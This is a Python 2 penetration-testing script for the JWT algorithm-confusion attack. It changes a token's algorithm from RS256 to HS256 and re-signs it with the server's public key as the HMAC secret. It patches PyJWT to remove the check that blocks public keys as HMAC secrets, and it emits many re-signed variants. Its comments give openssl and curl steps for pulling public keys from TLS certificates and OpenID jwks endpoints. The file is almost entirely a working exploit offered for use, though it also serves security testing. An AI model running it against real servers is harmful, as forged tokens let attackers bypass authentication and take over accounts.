#!/usr/bin/env python2
#############################################################
# @AaylaSecura1138, github.com/aayla-secura
# Modify and distribute as you wish
#############################################################
# NO LONGER MAINTAINED: CURRENT CODE LIVES HERE:
# https://github.com/aurainfosec/jwt_resign_asym_to_sym
#############################################################
# Some JWT libraries are vulnerable to a known attack which changes
# the type of a JWT from an asymmetric (e.g. RS256) to a symmetric
# one (e.g. HS256), as described here:
# https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
# 
# This script will change the type of a JWT to HS256 and re-sign it
# with a given public key. If the remote server is vulnerable it will
# try to verify the signature using its public key, as usual, but now
# using a symmetric algorithm and succeed. See also:
# https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/
# 
#############################################################
###### Getting the public key from the SSL certificate ######
#############################################################
# 
# Many sites use a single private/public key pair and that's the one
# in their SSL certificate, so try this, replacing {server} with the
# domain name and {HTTPS port} with e.g. 443:
# 
#   $ echo QUIT | openssl s_client -connect "{server}{HTTPS port}" -showcerts > /dev/null
# 
#  then extract the public key from it:
# 
#    $ openssl x509 -in cert.pem -pubkey -noout > key.pem
# 
#############################################################
####### Getting the public key from the OpenID conf #########
#############################################################
# 
# Servers which use OpenID keep the configuration in a well known
# location. If the OpenID endpoint is e.g.
# http://example.com/service/auth/, then try:
# 
#   $ curl http://example.com/service/auth/.well-known/openid-configuration
# 
# then look for the jwks_uri parameter. This points to the resource
# containing the public keys and their IDs. Fetch it, then choose the
# key with the same kid as the kid in the JWT headers:
# 
#   $ cut -d. -f1 <<<"{JWT here}" | base64 -d
# 
# After you have the JWT keys configuration (from the jwks_uri
# endpoint), and
# 1) you get the PEM certificate (x5c parameter), but no public key,
#    save the value of the certificate to a file (cert.pem), adding
#    the header and footer lines as follows:
# 
#    -----BEGIN CERTIFICATE-----
#    {value of x5c parameter}
#    -----END CERTIFICATE-----
# 
#    then extract the public key from it:
# 
#      $ openssl x509 -in cert.pem -pubkey -noout > key.pem
# 
# 2) you don't get the PEM certificate (x5c paramter), but instead
#    have the public key as a combination of a modulus (n parameter)
#    and exponent (e parameter), do:
# 
#     $ sed 's/-/+/g;s/_/\//g' <<<"<base64 of modulus>"
#   (see https://stackoverflow.com/a/13195218/8457586), then use this
#   online tool to generate a PEM public key from the modulus and
#   exponent: https://superdry.apphb.com/tools/online-rsa-key-converter
# 
#############################################################
# TO DO: support for signing with a key in DER format

import jwt
import sys
import re
import argparse

# jwt's HMACAlgorithm doesn't allow using public keys as secrets, so
# we override it here, removing the check
class HMACAlgorithm(jwt.algorithms.HMACAlgorithm):
    def prepare_key(self, key):
        key = jwt.utils.force_bytes(key)
        return key

jwt.api_jwt._jwt_global_obj._algorithms['HS256'] = \
        HMACAlgorithm(HMACAlgorithm.SHA256)

parser = argparse.ArgumentParser(
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
        description='''Re-sign a JWT with a public key,
        changing its type from RS265 to HS256. Unless disabled, it
        will re-sign it once for each possible line length of the
        public key (starting at the length of the header line).''')
parser.add_argument('-j', '--jwt-file', dest='jwt_file',
        default='jwt.txt', metavar='FILE',
        help='''File containing the JWT.''')
parser.add_argument('-k', '--key-file', dest='key_file',
        default='key.pem', metavar='FILE',
        help='''File containing the public PEM key.''')
parser.add_argument('-a', '--algorithm', dest='algorithm',
        default='RS256', metavar='ALGO',
        help='''Original algorithm of the JWT.''')
parser.add_argument('-n', '--no-vary', dest='no_vary',
        default=False, action='store_true',
        help='''Sign only once with the exact key given.''')
args = parser.parse_args()

with open(args.key_file, 'r') as f:
    try:
        pubkey = f.read()
    except: #TODO
        sys.exit(2)

with open(args.jwt_file, 'r') as f:
    try:
        token = f.read().translate(None, '\n ')
    except: #TODO
        sys.exit(2)

try:
    jwt.decode(token, pubkey, algorithms=args.algorithm)
except jwt.exceptions.InvalidSignatureError:
    sys.stderr.write('Wrong public key! Aborting.')
    sys.exit(1)
except: #TODO: catch only jwt.exceptions?
    pass

claims = jwt.decode(token, verify=False)
headers = jwt.get_unverified_header(token)
del headers['alg']
del headers['typ']

if args.no_vary:
    sys.stdout.write(jwt.encode(claims, pubkey, algorithm='HS256',
                headers=headers).decode('utf-8'))
    sys.exit(0)

lines = pubkey.rstrip('\n').split('\n')
if len(lines) < 3:
    sys.stderr.write('''Make sure public key is in a PEM format and
            includes header and footer lines!''')
    sys.exit(2)

hdr = pubkey.split('\n')[0]
ftr = pubkey.split('\n')[-1]
meat = ''.join(pubkey.split('\n')[1:-1])

sep = '\n-----------------------------------------------------------------\n'
for l in range(len(hdr), len(meat)+1):
    secret = '\n'.join([hdr] + filter(
        None,re.split('(.{%s})' % l, meat)) + [ftr])
    sys.stdout.write(
            '%s--- JWT signed with public key split at lines of length %s: ---%s%s' % \
            (sep, l, sep, jwt.encode(claims, secret, algorithm='HS256',
                headers=headers).decode('utf-8')))
    secret += '\n'
    sys.stdout.write(
            '%s------------- As above, but with a trailing newline: ------------%s%s' % \
            (sep, sep, jwt.encode(claims, secret, algorithm='HS256',
                headers=headers).decode('utf-8')))
